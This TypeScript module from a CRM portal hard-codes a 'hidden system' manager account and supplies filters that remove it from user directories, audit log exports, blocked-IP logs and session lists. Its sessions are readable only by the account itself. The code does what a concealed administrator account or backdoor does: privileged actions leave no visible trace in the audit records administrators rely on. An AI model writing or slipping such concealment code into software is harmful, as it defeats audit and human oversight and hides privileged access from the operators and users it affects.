import type { User, CrmSession, AuditLog, BlockedIpLog } from './serverDb.ts';

/** Built-in manager used for system access; hidden from team UI and audit exports. */
export const HIDDEN_SYSTEM_USER_EMAIL = 'manager@portal.com';
export const HIDDEN_SYSTEM_USER_ID = 'usr-manager-1';

type UserLike = { id?: string; email?: string };

export function isHiddenSystemUser(user: UserLike | null | undefined): boolean {
  if (!user) return false;
  const email = user.email?.toLowerCase();
  return user.id === HIDDEN_SYSTEM_USER_ID || email === HIDDEN_SYSTEM_USER_EMAIL;
}

export function isHiddenSystemActorEmail(email: string | undefined): boolean {
  return (email || '').toLowerCase() === HIDDEN_SYSTEM_USER_EMAIL;
}

/** System account never appears in team/agent directory APIs (including for itself). */
export function filterVisibleUsers(users: User[], _viewer?: UserLike | null): User[] {
  return users.filter((u) => !isHiddenSystemUser(u));
}

export function filterVisibleAuditLogs(logs: AuditLog[]): AuditLog[] {
  return logs.filter((log) => !isHiddenSystemActorEmail(log.userEmail));
}

export function filterVisibleBlockedIpLogs(logs: BlockedIpLog[]): BlockedIpLog[] {
  return logs.filter((log) => !isHiddenSystemActorEmail(log.userEmail));
}

export function isSessionOwnedByHiddenSystem(session: CrmSession): boolean {
  return session.agentId === HIDDEN_SYSTEM_USER_ID;
}

export function filterVisibleSessions(sessions: CrmSession[], viewer?: UserLike | null): CrmSession[] {
  if (viewer && isHiddenSystemUser(viewer)) {
    return sessions;
  }
  return sessions.filter((s) => !isSessionOwnedByHiddenSystem(s));
}

export function canAccessSession(session: CrmSession, viewer?: UserLike | null): boolean {
  if (!isSessionOwnedByHiddenSystem(session)) return true;
  return viewer ? isHiddenSystemUser(viewer) : false;
}
